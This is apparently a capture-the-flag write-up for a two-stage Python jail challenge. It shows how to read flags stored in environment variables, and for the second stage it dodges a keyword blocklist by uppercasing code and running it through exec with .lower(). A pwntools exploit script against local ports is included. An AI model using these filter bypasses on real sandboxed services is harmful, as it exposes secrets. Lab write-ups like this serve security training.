# Pyjail

## Description
This challenge is divided into two entry-level pyjail:
- First jail
- Second jail

## Solution
By looking at the source code, we know that the two flags are two environment variables defined in the `docker-compose.yml`, and they are respectively `flag1` and `flag2`.

To obtain the first flag, it's enough to import the `os` library and print the `flag1` environment variable since there are no limitations:
```bash
>>> import os; print(os.environ['flag1'])
```

To obtain the second one, however, we need to bypass some checks:
```py
if any(x in user_input for x in ["import", "environ", "getenv", "os", "print", "system", "__", "open", "flag"]):
    print("Blocked!")
    continue
```
This is easy to do since we can use `exec` again, write everything in uppercase, and use the `.lower()` function.
```bash
>>> exec("IMPORT OS; PRINT(OS.ENVIRON['FLAG2'])".lower())
```

## Exploit
```py
from pwn import remote, context

context.log_level = 'error'

payload1 = b"import os; print(os.environ['flag1'])"
payload2 = b"exec(\"IMPORT OS; PRINT(OS.ENVIRON['FLAG2'])\".lower())"

r = remote("127.0.0.1", 5004)
r.recvuntil(b">>> ")
r.sendline(payload1)
flag1 = r.recvline().decode().strip()
r.close()

r = remote("127.0.0.1", 5005)
r.recvuntil(b">>> ")
r.sendline(payload2)
flag2 = r.recvline().decode().strip()
r.close()

print(flag1)
print(flag2)
```
